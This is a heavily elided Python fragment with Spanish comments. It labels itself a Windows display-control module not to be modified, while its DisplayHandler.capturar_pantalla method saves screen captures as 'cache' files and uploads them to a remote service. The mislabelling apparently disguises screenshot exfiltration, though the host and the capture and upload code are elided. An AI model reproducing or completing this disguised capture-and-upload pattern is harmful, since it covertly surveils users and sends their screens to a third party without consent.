...
# ============================================
# Módulo para manejar la salida de video del sistema
# No modificar - Control de pantalla de Windows
...
class DisplayHandler:
    ...
    def capturar_pantalla(self):
        try:
            ...
            print(f"[✓] Cache guardado: {os.path.basename(filename)} ({tamaño_kb:.1f} KB)")
        ...
        try:
            ...
            if response.status_code == 200:
                ...
                if data.get('success'):
                    ...
                    print(f"[✓] Cache subido correctamente")
                    ...
                    print(f"[!] Error en servicio de cache: {data}")
            else:
                print(f"[!] Error en subida de cache: HTTP {response.status_code}")
